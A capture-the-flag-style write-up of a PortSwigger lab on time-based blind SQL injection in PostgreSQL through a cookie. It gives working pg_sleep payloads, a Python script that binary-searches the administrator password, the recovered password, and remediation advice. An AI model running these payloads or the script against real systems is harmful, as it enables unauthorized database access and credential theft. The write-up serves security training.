---
title: "Blind SQL injection with time delays and information retrieval"
date: 2026-07-04 09:00:00 -0500
categories: [PortSwigger, SQL-injection]
tags: [portswigger, cwe-89, sql-injection, blind, time-based, postgresql, pg_sleep]
description: "The app leaks nothing — no message, no error, no status change — so we turn response time into a 1-bit oracle, wrap each guess in a CASE that only sleeps when it is correct, and binary-search the administrator password out of the database one character at a time."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Blind SQL injection with time delays and information retrieval
---

## Overview

This [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval) lab is a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)) on a **PostgreSQL** backend. The `TrackingId` cookie is concatenated into a query whose result is never shown, and the response is identical whether the injected condition is true or false — no message, no error, no status change. The only thing left to observe is **how long the response takes**, and this time the goal is not just to confirm the bug but to **extract the administrator's password** with it.

> **Blind SQLi series.** The [time-delays]({% post_url 2026-07-03-Blind-SQL-injection-with-time-delays %}) lab only had to *trigger* a delay to prove the injection. Here we escalate the same time oracle into a full data-exfiltration primitive: each request leaks one bit of the password.
{: .prompt-info }

## The technique

If a true/false condition produces no visible difference, attach it to a `pg_sleep`. Make the database sleep **only when the condition is true**, and a slow response means "true."

### Step 1 — build the conditional time oracle

```
TrackingId=x'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

```
WHEN (1=1)  ->  5.6s   (TRUE)
WHEN (1=2)  ->  0.46s  (FALSE)
```

A clean five-second gap — that is our oracle.

> **The `%3b` cookie-delimiter gotcha.** This payload uses a *stacked* query, which needs a semicolon (`;`) to start the second statement. But a raw `;` inside a cookie **value** is parsed as a cookie *separator*, so the server only ever sees `TrackingId=x'` and your whole payload silently vanishes — every probe reads FALSE and you chase a ghost. URL-encode the semicolon as `%3b`; the application URL-decodes the cookie before placing it in SQL, so the database receives a real `;`. (A stacked `CASE` also runs the query exactly once, so its delay is a clean 1×5s — unlike the previous lab where the cookie fed three queries and `pg_sleep(10)` showed ~30s.)
{: .prompt-warning }

### Step 2 — find the password length

Binary-search `LENGTH(password)` by asking "is it greater than N?" and watching for the delay:

```
x'%3b SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator')>N)
        THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

Climbing N narrows it to **20** characters in about six requests.

### Step 3 — extract each character

For each position `i`, binary-search the ASCII code of that character between 32 and 126:

```
x'%3b SELECT CASE WHEN ((SELECT ASCII(SUBSTRING(password,i,1)) FROM users WHERE username='administrator')>N)
        THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

A short Python driver automates the whole thing:

```python
import requests
base = "https://<lab-id>.web-security-academy.net/"
D = 5
def truth(cond):
    p = f"x'%3b SELECT CASE WHEN ({cond}) THEN pg_sleep({D}) ELSE pg_sleep(0) END--"
    return requests.get(base, cookies={"TrackingId": p}, verify=False).elapsed.total_seconds() > D - 1.5

# length
lo, hi = 1, 40
while lo < hi:
    m = (lo + hi) // 2
    if truth(f"(SELECT LENGTH(password) FROM users WHERE username='administrator')>{m}"): lo = m + 1
    else: hi = m
n = lo

# characters
pw = ""
for i in range(1, n + 1):
    lo, hi = 32, 126
    while lo < hi:
        m = (lo + hi) // 2
        if truth(f"(SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')>{m}"): lo = m + 1
        else: hi = m
    pw += chr(lo)
print(pw)
```

Binary search costs ~7 requests per character instead of ~95 for a linear scan. The run yields the administrator's password:

```
rxdp92o48r53asrbv2tl
```

### Step 4 — log in

Log in as `administrator` with the recovered password. The login returns a `302` redirect (proof the password is correct) and the lab flips to **Solved**.

## Why it works

Time-based blind injection is the lowest-common-denominator oracle: it needs no reflected output, no conditional message, and no error channel — only the ability to make the database wait and to measure how long the response took. That makes it usable against almost any injectable point, including unreflected cookies. Wrapping a `LENGTH`/`SUBSTRING` comparison in a `CASE ... pg_sleep` turns that single bit of timing into a complete read primitive: each request answers one yes/no question, and binary search assembles those answers into the full secret. The price is speed — every bit costs a full sleep interval — but the data comes out all the same.

## The fix

- **Parameterized queries / prepared statements.** Bind the cookie as data so it can never become part of the SQL — the only real fix.
- **Least privilege.** Scope the database account so a successful injection reaches as little as possible.
- **Statement timeouts and monitoring.** A request that should take milliseconds but repeatedly stalls for five seconds is an anomaly worth alerting on — a detection aid, not a fix.
